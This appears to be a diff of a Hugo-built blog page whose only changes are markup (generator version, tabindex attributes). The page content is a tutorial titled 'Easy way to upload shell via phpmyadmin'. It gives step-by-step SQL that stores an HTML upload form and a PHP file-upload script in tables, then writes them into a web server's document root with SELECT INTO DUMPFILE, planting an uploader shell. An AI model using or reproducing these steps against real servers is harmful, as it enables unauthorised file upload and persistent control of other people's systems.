@@ -1358,7 +1358,7 @@
     <meta property="twitter:description" content="Easy way to upload shell via phpmyadmin.">
   
 
-<meta name="generator" content="Hugo 0.83.1" />
+<meta name="generator" content="Hugo 0.88.1" />
 <meta name="msapplication-TileColor" content="#fff">
 
 <meta name="theme-color" content="#fff">
@@ -1745,12 +1745,12 @@
 <p>Go to phpMyadmin database and create new database, ex: &ldquo;uploader&rdquo; and than select on SQL tap and paste this code below.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">uploader</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">userform</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">uploader</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">userform</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
 </span><span class="w"></span><span class="o">`</span><span class="n">track1</span><span class="o">`</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="w"> </span><span class="mi">1000</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w">
 </span><span class="w"></span><span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MYISAM</span><span class="w"> </span><span class="p">;</span></code></pre></td></tr></table>
 </div>
@@ -1758,12 +1758,12 @@
 <p>And this code.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">uploader</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">user_upload</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">uploader</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">user_upload</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
 </span><span class="w"></span><span class="o">`</span><span class="n">track2</span><span class="o">`</span><span class="w"> </span><span class="nb">VARCHAR</span><span class="p">(</span><span class="w"> </span><span class="mi">1000</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w">
 </span><span class="w"></span><span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MYISAM</span><span class="w"> </span><span class="p">;</span></code></pre></td></tr></table>
 </div>
@@ -1771,7 +1771,7 @@
 <p>Now select on table user_upload and SQL tap and paste this code below.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1789,7 +1789,7 @@
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">userform</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">insert</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">userform</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;
 </span><span class="s1">&lt;head&gt;
 </span><span class="s1">&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34; /&gt;
 </span><span class="s1">&lt;title&gt;Uploader&lt;/title&gt;
@@ -1810,17 +1810,17 @@
 <p>And this code.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/wkspace/up.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">userform</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/wkspace/up.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">userform</span></code></pre></td></tr></table>
 </div>
 </div>
 <p>To find the path of the database webserver, we can use this syntax &ldquo;SELECT @@datadir&rdquo; on the SQL query <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">SQL Cheatsheet</a></p>
 <p>After that paste this code below in user_upload table.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1828,7 +1828,7 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">user_upload</span><span class="w">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">user_upload</span><span class="w">
 </span><span class="w"></span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="w">
 </span><span class="w"></span><span class="s2">&#34;&lt;?php $uploaddir = &#39;C:/xampp/htdocs/wkspace/&#39;; $uploadfile = $uploaddir . basename($_FILES[&#39;userfile&#39;][&#39;name&#39;]); if
 </span><span class="s2"> 
@@ -1839,10 +1839,10 @@
 <p>And finally paste this code below.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/wkspace/uploader.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">user_upload</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/wkspace/uploader.php&#39;</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">user_upload</span></code></pre></td></tr></table>
 </div>
 </div>
 <p>Now browse to the file location and load the uploader.</p>
